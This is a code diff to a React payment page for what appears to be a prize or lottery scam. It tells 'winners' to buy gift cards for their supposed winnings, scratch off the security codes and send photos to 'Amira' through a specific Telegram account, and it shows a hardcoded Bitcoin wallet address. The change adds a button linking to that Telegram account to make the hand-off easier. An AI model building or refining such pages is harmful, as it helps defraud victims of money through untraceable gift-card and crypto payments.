@@ -142,8 +142,8 @@ function PaymentPageContent() {
         instructions: [
           `Purchase a ${winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })} Apple card, Steam, Razer Gold or Footlocker gift card`,
           "Scratch off the security code on the back",
-          "Send a clear photo of the front and back",
-          "Send to Amira on telegram: https://t.me/amira_aldahab8391",
+          "Send a clear photo of the front and back to me using the button below",
+          "Send to Amira on telegram",
           "Contact support with your order confirmation"
         ]
       }
@@ -464,6 +464,7 @@ Recommended
                         {method.instructions.map((instruction: string, index: number) => {
                           const isBitcoinAddress = method.id === 'btc' && instruction.includes('3MCueff99G5qkpNqmsfnM7y5LREKWRpG5z');
                           const walletAddress = '3MCueff99G5qkpNqmsfnM7y5LREKWRpG5z';
+                          const isTelegramInstruction = instruction.includes('Send to Amira on telegram');
                           
                           return (
                             <li key={index} className="flex items-start">
@@ -494,6 +495,15 @@ Recommended
                                     </code>
                                   </div>
                                 </div>
+                              ) : isTelegramInstruction ? (
+                                <a
+                                  href="https://t.me/amira_aldahab8391"
+                                  target="_blank"
+                                  rel="noopener noreferrer"
+                                  className="inline-flex items-center px-4 py-2 bg-blue-500 text-white font-medium rounded-lg hover:bg-blue-600 transition-colors text-sm"
+                                >
+                                  Message Amira here
+                                </a>
                               ) : (
                                 <span>{instruction}</span>
                               )}
